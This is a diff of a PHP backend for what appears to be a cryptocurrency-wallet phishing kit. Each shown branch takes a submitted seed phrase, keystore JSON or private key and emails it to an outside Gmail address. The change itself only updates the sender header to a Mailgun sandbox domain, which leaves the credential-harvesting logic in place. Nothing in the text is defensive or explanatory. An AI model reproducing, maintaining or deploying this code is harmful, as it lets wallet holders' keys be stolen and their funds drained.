@@ -15,7 +15,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'phrase') {
 		$auto_mechanic='jeffheart7@gmail.com';
 
 
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:app281973412@heroku.com');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:sandbox6f2ee57cbd40415e98c6ad72fefcc23d.mailgun.org');
 
 
 		echo 'success';
@@ -36,7 +36,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'keystorejson') {
     $auto_mechanic='jeffheart7@gmail.com';
    
 
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:app281973412@heroku.com');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:sandbox6f2ee57cbd40415e98c6ad72fefcc23d.mailgun.org');
      
 		echo 'success';
   }
@@ -54,7 +54,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'private') {
 
 		$auto_mechanic='jeffheart7@gmail.com';
    
-	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:app281973412@heroku.com');
+	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:sandbox6f2ee57cbd40415e98c6ad72fefcc23d.mailgun.org');
      
 
 		echo 'success';
